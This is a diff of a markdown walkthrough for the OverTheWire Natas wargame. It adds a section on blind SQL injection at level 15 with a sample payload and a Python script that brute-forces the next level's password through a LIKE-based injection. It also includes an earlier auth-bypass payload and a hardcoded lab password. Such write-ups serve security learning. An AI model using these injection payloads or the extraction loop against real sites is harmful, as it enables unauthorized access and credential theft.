@@ -292,7 +292,6 @@ This level enhances file upload security by checking the file's actual signature
 6. Access the uploaded file via the provided link. The PHP code at the end will execute and reveal the password for natas14.
 
 ### Natas Level 14 → Level 15  
-
 **Key Takeaways**: This level introduces basic SQL injection in login forms. It highlights the risk of including unsanitized user input directly in SQL queries, which can allow attackers to bypass authentication.
 
 **Procedure**:
@@ -315,3 +314,80 @@ which means the query takes our input as it is and there is no input sanitizatio
 		Password: "or""="
 
 7. This will directly give us the password to the next level.
+
+### Natas Level 15 → Level 16  
+**Key Takeaways**: This level challenges you to perform blind SQL injection. The server gives no visible output about whether a login attempt succeeded or failed — instead, you infer success based on subtle clues (e.g., different page content).
+
+**Procedure**:
+
+1. Log in using the username `natas15` and the password obtained from Level 14.
+
+2. The page presents a login form with just a username field (no password).
+
+3. View source code using the link provided. 
+
+4. The query checks for:
+   
+   	SELECT * from users where username=\"".$_REQUEST["username"]."\"
+   
+6. The goal is to extract the password for natas16 by asking yes/no questions in SQL. Example payload:
+
+	natas16" AND SUBSTRING(password,1,1) = "a" #
+
+If the first character is "a", the page content will change to indicate the user exists.
+
+7. Automate this by writing a script (Python, Bash, etc.) to loop through characters and positions:
+
+- Try all possible characters (a-z, A-Z, 0-9).
+
+- For each position in the password, test each character.
+
+- When you get a hit, record the character and move to the next position.
+
+  Sample script (Credits: John Hammond):
+
+  		#!/usr/bin/env python3
+		# -*- coding: utf-8 -*-
+
+		import requests
+		import time
+		from string import ascii_lowercase, ascii_uppercase, digits
+
+		characters = ascii_lowercase + ascii_uppercase + digits
+		print(characters)
+
+		username = 'natas15'
+		password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
+
+		url = f'http://{username}.natas.labs.overthewire.org/'
+
+		session = requests.Session()
+		seen_password = []
+
+		while True:
+    		for ch in characters:
+        		attempt = "".join(seen_password) + ch
+        		print(f"Trying with password: {attempt}")
+        		try:
+            		response = session.post(
+                		url,
+                		data={ "username": f'natas16" AND BINARY password LIKE "{attempt}%" #' },
+                		auth=(username, password),
+                		timeout=10
+            		)
+            		if 'user exists' in response.text:
+                		seen_password.append(ch)
+                		print(f"[+] Found so far: {''.join(seen_password)}")
+                		break
+        		except requests.exceptions.RequestException as e:
+            		print(f"Request failed: {e}")
+            		time.sleep(1)
+            		continue
+
+        		time.sleep(0.1)
+
+    		if len(seen_password) == 32:
+        		print(f"[✓] Password found: {''.join(seen_password)}")
+        		break
+
+This will build the password one character at a time until complete.
